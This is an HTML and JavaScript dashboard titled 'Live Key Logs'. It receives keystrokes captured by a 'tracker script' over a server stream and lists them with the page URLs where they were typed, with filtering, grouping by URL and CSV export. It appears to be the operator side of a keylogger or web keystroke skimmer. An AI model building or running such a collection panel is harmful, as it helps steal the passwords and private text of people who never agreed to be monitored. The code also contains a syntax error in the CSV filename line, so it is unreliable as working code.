<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Live Key Logs</title>
  <style>
    :root {
      --bg: #0b0b0f;
      --bg-alt: #111118;
      --bg-row: #101018;
      --bg-row-alt: #15151f;
      --text: #e5e5e5;
      --text-muted: #999;
      --border: #222;
      --accent: #4dabf7;
      --accent-soft: #243b53;
      --pill-bg: #222235;
      --pill-border: #33334a;
      --pill-special-bg: #3c2a4d;
      --pill-special-border: #c678dd;
      --pill-space-bg: #243b53;
      --pill-space-border: #4dabf7;
      --shadow-dot: 0 0 8px #2ecc71;
    }
    body.light {
      --bg: #f4f5f8;
      --bg-alt: #ffffff;
      --bg-row: #ffffff;
      --bg-row-alt: #f0f2f7;
      --text: #151515;
      --text-muted: #555;
      --border: #d0d4e0;
      --accent: #1d6fd8;
      --accent-soft: #d7e3ff;
      --pill-bg: #e6e8f5;
      --pill-border: #c0c4e0;
      --pill-special-bg: #f3ddff;
      --pill-special-border: #c678dd;
      --pill-space-bg: #d7e9ff;
      --pill-space-border: #1d6fd8;
      --shadow-dot: 0 0 4px #2ecc71;
    }
    * {
      box-sizing: border-box;
    }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
        sans-serif;
      margin: 0;
      padding: 0;
    }
    header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 14px 20px;
      border-bottom: 1px solid var(--border);
      background: var(--bg-alt);
      position: sticky;
      top: 0;
      z-index: 10;
    }
    .status {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .dot {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: #2ecc71;
      box-shadow: var(--shadow-dot);
    }
    h1 {
      font-size: 20px;
      margin: 0;
    }
    .subtitle {
      font-size: 12px;
      color: var(--text-muted);
      margin-top: 2px;
    }
    .controls {
      display: flex;
      align-items: center;
      gap: 10px;
      flex-wrap: wrap;
      justify-content: flex-end;
    }
    .controls input {
      padding: 6px 10px;
      border-radius: 6px;
      border: 1px solid var(--border);
      background: var(--bg-row);
      color: var(--text);
      min-width: 220px;
      font-size: 13px;
    }
    .controls input:focus {
      outline: none;
      border-color: var(--accent);
    }
    .btn {
      padding: 6px 10px;
      border-radius: 6px;
      border: 1px solid var(--border);
      background: var(--bg-row);
      color: var(--text);
      font-size: 12px;
      cursor: pointer;
    }
    .btn:hover {
      border-color: var(--accent);
    }
    .btn-primary {
      background: var(--accent);
      color: #fff;
      border-color: var(--accent);
    }
    .btn-primary:hover {
      filter: brightness(1.05);
    }
    .badge {
      font-size: 11px;
      padding: 4px 8px;
      border-radius: 999px;
      background: var(--bg-row);
      border: 1px solid var(--border);
      color: var(--text-muted);
      white-space: nowrap;
    }
    main {
      padding: 14px 20px 30px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 10px;
      font-size: 13px;
    }
    thead {
      background: var(--bg-alt);
      position: sticky;
      top: 56px;
      z-index: 5;
    }
    th,
    td {
      padding: 8px 10px;
      border-bottom: 1px solid var(--border);
      vertical-align: top;
    }
    th {
      text-align: left;
      font-weight: 600;
      color: var(--text-muted);
      font-size: 12px;
    }
    tbody tr:nth-child(even) {
      background: var(--bg-row);
    }
    tbody tr:nth-child(odd) {
      background: var(--bg-row-alt);
    }
    tbody tr:hover {
      filter: brightness(1.05);
    }
    .col-id {
      width: 55px;
      color: var(--text-muted);
      font-size: 11px;
    }
    .col-time {
      width: 170px;
      font-family: "JetBrains Mono", Consolas, monospace;
      font-size: 11px;
      color: var(--text);
    }
    .col-url a {
      color: var(--accent);
      text-decoration: none;
      word-break: break-all;
      font-size: 12px;
    }
    .col-url a:hover {
      text-decoration: underline;
    }
    .col-keys {
      font-family: "JetBrains Mono", Consolas, monospace;
      white-space: pre-wrap;
      word-break: break-word;
      font-size: 12px;
    }
    .pill {
      display: inline-block;
      padding: 2px 6px;
      margin: 1px 2px 1px 0;
      border-radius: 999px;
      background: var(--pill-bg);
      border: 1px solid var(--pill-border);
    }
    .pill-special {
      background: var(--pill-special-bg);
      border-color: var(--pill-special-border);
      color: #fdf2ff;
    }
    .pill-space {
      background: var(--pill-space-bg);
      border-color: var(--pill-space-border);
      color: #dbeafe;
    }
    .no-logs {
      text-align: center;
      padding: 40px 10px;
      color: var(--text-muted);
      font-size: 13px;
    }
    .footer-note {
      margin-top: 12px;
      font-size: 11px;
      color: var(--text-muted);
    }
    .group-label {
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.06em;
      color: var(--text-muted);
      margin-bottom: 4px;
    }
  </style>
</head>
<body>
  <header>
    <div class="status">
      <div class="dot"></div>
      <div>
        <h1>Live Key Logs</h1>
        <div class="subtitle">
          Realtime activity from your tracker script (newest on top)
        </div>
      </div>
    </div>
    <div class="controls">
      <input
        id="filterInput"
        type="text"
        placeholder="Filter by URL or keys..."
      />
      <button id="groupToggle" class="btn">Group by URL: OFF</button>
      <button id="themeToggle" class="btn">Theme: Dark</button>
      <button id="downloadBtn" class="btn">Download CSV</button>
      <button id="clearBtn" class="btn">Clear</button>
      <span class="badge" id="countBadge">0 entries</span>
    </div>
  </header>

  <main>
    <table>
      <thead>
        <tr>
          <th class="col-id">#</th>
          <th class="col-time">Time</th>
          <th class="col-url">Page URL</th>
          <th class="col-keys">Keys</th>
        </tr>
      </thead>
      <tbody id="logBody">
        <tr>
          <td colspan="4" class="no-logs">Waiting for logs...</td>
        </tr>
      </tbody>
    </table>

    <div class="footer-note">
      • Logs are kept in memory (latest 1000 entries).<br />
      • "Group by URL" shows one row per page with the latest keys and a
      counter.<br />
      • Download CSV exports all logs currently in memory.
    </div>
  </main>

  <script>
    // ---------- STATE ----------
    let logs = [];
    let nextId = 1;
    let filterText = "";
    let groupedMode = false;
    const MAX_LOGS = 1000;

    // ---------- DOM ----------
    const logBody = document.getElementById("logBody");
    const filterInput = document.getElementById("filterInput");
    const countBadge = document.getElementById("countBadge");
    const groupToggle = document.getElementById("groupToggle");
    const themeToggle = document.getElementById("themeToggle");
    const downloadBtn = document.getElementById("downloadBtn");
    const clearBtn = document.getElementById("clearBtn");

    // ---------- THEME ----------
    function applyTheme(theme) {
      document.body.className = theme === "light" ? "light" : "";
      themeToggle.textContent = "Theme: " + (theme === "light" ? "Light" : "Dark");
      localStorage.setItem("dashboard_theme", theme);
    }

    const savedTheme = localStorage.getItem("dashboard_theme") || "dark";
    applyTheme(savedTheme);

    themeToggle.addEventListener("click", () => {
      const current = document.body.classList.contains("light") ? "light" : "dark";
      applyTheme(current === "light" ? "dark" : "light");
    });

    // ---------- HELPERS ----------
    function normalizeLog(data) {
      const url = data.url || "N/A";
      const keysArr = Array.isArray(data.keys)
        ? data.keys.map(k => String(k))
        : [String(data.keys ?? "")];

      const tsArr = Array.isArray(data.timestamps) ? data.timestamps : [];
      const primaryTs =
        (tsArr[0] || new Date().toISOString()).replace("T", " ").slice(0, 19);

      return {
        id: nextId++,
        url,
        keys: keysArr,
        timestamps: tsArr,
        time: primaryTs
      };
    }

    function keyPillSpan(key) {
      const span = document.createElement("span");
      span.classList.add("pill");
      if (key === " ") {
        span.classList.add("pill-space");
        span.textContent = "[space]";
      } else if (/^\[.*\]$/.test(key)) {
        span.classList.add("pill-special");
        span.textContent = key;
      } else {
        span.textContent = key;
      }
      return span;
    }

    function matchesFilter(log) {
      if (!filterText) return true;
      const f = filterText.toLowerCase();
      return (
        log.url.toLowerCase().includes(f) ||
        log.keys.join(" ").toLowerCase().includes(f)
      );
    }

    // ---------- RENDER ----------
    function render() {
      logBody.innerHTML = "";

      const filtered = logs.filter(matchesFilter);

      countBadge.textContent =
        filtered.length + " entr" + (filtered.length === 1 ? "y" : "ies");

      if (filtered.length === 0) {
        const row = document.createElement("tr");
        const cell = document.createElement("td");
        cell.colSpan = 4;
        cell.className = "no-logs";
        cell.textContent = "No logs to display yet.";
        row.appendChild(cell);
        logBody.appendChild(row);
        return;
      }

      if (!groupedMode) {
        // --- FLAT MODE ---
        filtered.forEach(log => {
          const tr = document.createElement("tr");

          const tdId = document.createElement("td");
          tdId.className = "col-id";
          tdId.textContent = "#" + log.id;
          tr.appendChild(tdId);

          const tdTime = document.createElement("td");
          tdTime.className = "col-time";
          tdTime.textContent = log.time;
          tr.appendChild(tdTime);

          const tdUrl = document.createElement("td");
          tdUrl.className = "col-url";
          const a = document.createElement("a");
          a.href = log.url;
          a.target = "_blank";
          a.rel = "noopener noreferrer";
          a.textContent = log.url;
          tdUrl.appendChild(a);
          tr.appendChild(tdUrl);

          const tdKeys = document.createElement("td");
          tdKeys.className = "col-keys";
          log.keys.forEach(k => tdKeys.appendChild(keyPillSpan(k)));
          tr.appendChild(tdKeys);

          logBody.appendChild(tr);
        });
      } else {
        // --- GROUPED BY URL ---
        const byUrl = new Map();
        filtered.forEach(log => {
          if (!byUrl.has(log.url)) {
            byUrl.set(log.url, []);
          }
          byUrl.get(log.url).push(log);
        });

        const groups = Array.from(byUrl.entries()).sort((a, b) => {
          const aTime = a[1][0].time;
          const bTime = b[1][0].time;
          return bTime.localeCompare(aTime);
        });

        let idx = 1;
        groups.forEach(([url, groupLogs]) => {
          const latest = groupLogs[0];
          const total = groupLogs.length;

          const tr = document.createElement("tr");

          const tdId = document.createElement("td");
          tdId.className = "col-id";
          tdId.textContent = "#" + idx++;
          tr.appendChild(tdId);

          const tdTime = document.createElement("td");
          tdTime.className = "col-time";
          tdTime.innerHTML =
            latest.time + "<br/><span class='group-label'>" + total +
            " entr" + (total === 1 ? "y" : "ies") + "</span>";
          tr.appendChild(tdTime);

          const tdUrl = document.createElement("td");
          tdUrl.className = "col-url";
          const a = document.createElement("a");
          a.href = url;
          a.target = "_blank";
          a.rel = "noopener noreferrer";
          a.textContent = url;
          tdUrl.appendChild(a);
          tr.appendChild(tdUrl);

          const tdKeys = document.createElement("td");
          tdKeys.className = "col-keys";
          latest.keys.forEach(k => tdKeys.appendChild(keyPillSpan(k)));
          tr.appendChild(tdKeys);

          logBody.appendChild(tr);
        });
      }
    }

    // ---------- EVENTS ----------
    filterInput.addEventListener("input", e => {
      filterText = e.target.value.trim();
      render();
    });

    groupToggle.addEventListener("click", () => {
      groupedMode = !groupedMode;
      groupToggle.textContent = "Group by URL: " + (groupedMode ? "ON" : "OFF");
      render();
    });

    clearBtn.addEventListener("click", () => {
      logs = [];
      nextId = 1;
      render();
    });

    downloadBtn.addEventListener("click", () => {
      if (!logs.length) return;
      const rows = [
        ["id", "time", "url", "keys", "timestamps"]
      ];
      logs.forEach(log => {
        rows.push([
          log.id,
          log.time,
          log.url,
          log.keys.join(" "),
          (log.timestamps || []).join(" | ")
        ]);
      });
      const csv = rows
        .map(r =>
          r
            .map(v =>
              '"' + String(v).replace(/"/g, '""') + '"'
            )
            .join(",")
        )
        .join("\n");

      const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      const now = new Date();
      const stamp =
        now.getFullYear().toString() +
        String(now.getMonth() + 1).padStart(2, "0") +
        String(now.getDate()).padStart(2, "0") +
        "-" +
        String(now.getHours()).padStart(2, "0") +
        String(now.getMinutes()).padStart(2, "0") +
        String(now.getSeconds()).padStart(2, "0");
      a.href = url;
      a.download = "logs-"stamp + ".csv";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    });

    // ---------- SSE CONNECTION ----------
    const evtSource = new EventSource("/stream");
    evtSource.onmessage = event => {
      try {
        const data = JSON.parse(event.data);
        const log = normalizeLog(data);

        // newest on top
        logs.unshift(log);
        if (logs.length > MAX_LOGS) {
          logs = logs.slice(0, MAX_LOGS);
        }
        render();
      } catch (e) {
        console.error("Failed to parse event data", e);
      }
    };

    evtSource.onerror = err => {
      console.error("EventSource error:", err);
    };

    // initial render
    render();
  </script>
</body>
</html>
